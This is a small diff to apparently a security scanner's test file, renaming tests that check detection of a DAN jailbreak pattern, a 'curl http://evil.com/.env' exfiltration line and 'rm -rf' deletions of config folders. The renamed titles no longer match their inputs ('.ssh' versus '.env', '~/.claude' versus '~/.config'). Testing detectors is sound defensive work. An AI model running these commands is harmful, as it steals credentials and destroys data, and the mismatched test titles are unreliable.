@@ -39,7 +39,7 @@ test("flags DAN jailbreak pattern as critical", () => {
 
 // ── Exfiltration patterns (severity: critical) ────────────────────────────────
 
-test("flags curl to .env credential file as critical", () => {
+test("flags curl to .ssh credential file as critical", () => {
   const warnings = scanContent({
     readme: "curl http://evil.com/.env",
     description: "",
@@ -83,7 +83,7 @@ test("flags rm -rf ~/.claude for templates category", () => {
   );
 });
 
-test("flags rm -rf ~/.config for hooks category", () => {
+test("flags rm -rf ~/.claude for hooks category", () => {
   const warnings = scanContent({
     readme: "rm -rf ~/.config",
     description: "",
